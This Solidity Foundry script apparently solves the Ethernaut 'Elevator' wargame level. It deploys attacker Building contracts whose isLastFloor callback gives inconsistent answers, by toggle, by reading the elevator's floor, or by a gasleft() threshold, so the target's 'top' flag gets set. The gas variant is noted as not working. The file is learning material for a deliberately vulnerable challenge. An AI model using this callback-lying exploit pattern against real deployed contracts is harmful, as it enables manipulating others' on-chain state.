// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Elevator, Building} from "src/11Elevator.sol";

contract BuildingContract is Building {
    bool private toggle;

    function isLastFloor(uint256) external override returns (bool) {
        if (!toggle) {
            toggle = true;
            return false;
        }
        return true;
    }

    function attack(address _elevator) public {
        Elevator(_elevator).goTo(1);
    }
}

contract BuildingViewContract is Building {
    /// @dev Called by Elevator twice inside goTo().
    /// On first call Elevator.floor() != _floor => return false (enter the if)
    /// After Elevator sets floor = _floor, second call sees equality => return true.
    function isLastFloor(uint256 _floor) external view override returns (bool) {
        Elevator el = Elevator(msg.sender);
        return (el.floor() == _floor);
    }

    /// @notice Trigger the attack by calling this from an EOA.
    /// This contract must be the caller of Elevator.goTo so that msg.sender inside
    /// Elevator is this contract (the Building).
    function attack(address elevatorAddr, uint256 _floor) external {
        Elevator(elevatorAddr).goTo(_floor);
    }
}

contract BuildingGasLeftContract is Building {
    uint256 private constant GAS_THRESHOLD = 120000;

    /// @dev Called twice by Elevator.goTo(_floor).
    /// First call: lots of gas available -> gasleft() >= GAS_THRESHOLD -> return false.
    /// Second call: less gas left -> gasleft() < GAS_THRESHOLD -> return true.
    function isLastFloor(uint256) external view override returns (bool) {
        return gasleft() < GAS_THRESHOLD;
    }

    function attack(address _elevator) public {
        Elevator ele = Elevator(_elevator);
        ele.goTo(1);
        require(ele.top(), "Failed to reach the top floor");
    }
}

contract ElevatorAttack is Script {
    address constant CHALLENGE = 0x969989cD73C242C32e739aACA0Be1be39972eE35;
    BuildingContract public buildingContract;
    Elevator public elevator;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        buildingContract = new BuildingContract();
        elevator = Elevator(CHALLENGE);
        console.log("BuildingContract deployed at:", address(buildingContract));
        console.log("1 Elevator top:", elevator.top());
        buildingContract.attack(CHALLENGE);
        console.log("2 Elevator top:", elevator.top());
        vm.stopBroadcast();
    }
}

contract ElevatorViewAttack is Script {
    address constant CHALLENGE = 0x264A8979D9276cA910BD0e2416c82b4Ff1FCB5b1;
    BuildingViewContract public buildingContract;
    Elevator public elevator;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        buildingContract = new BuildingViewContract();
        elevator = Elevator(CHALLENGE);
        console.log("BuildingViewContract deployed at:", address(buildingContract));
        console.log("1 Elevator top:", elevator.top());
        buildingContract.attack(CHALLENGE, 1);
        console.log("2 Elevator top:", elevator.top());
        vm.stopBroadcast();
    }
}

/// @dev Not working now as didn't manage to estimate the right GAS_THRESHOLD.
/// The gas left depends on many factors, including the EVM version, the
/// compiler optimizations, etc. It can also change over time as the EVM evolves.
/// So this attack is quite unreliable unless you can fine-tune the GAS_THRESHOLD
/// constant to fit the current environment.
contract ElevatorGasLeftAttack is Script {
    address constant CHALLENGE = 0x264A8979D9276cA910BD0e2416c82b4Ff1FCB5b1;
    BuildingGasLeftContract public buildingContract;
    Elevator public elevator;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        buildingContract = new BuildingGasLeftContract();
        elevator = Elevator(CHALLENGE);
        console.log("BuildingGasLeftContract deployed at:", address(buildingContract));
        console.log("1 Elevator top:", elevator.top());
        buildingContract.attack(CHALLENGE);
        console.log("2 Elevator top:", elevator.top());
        vm.stopBroadcast();
    }
}
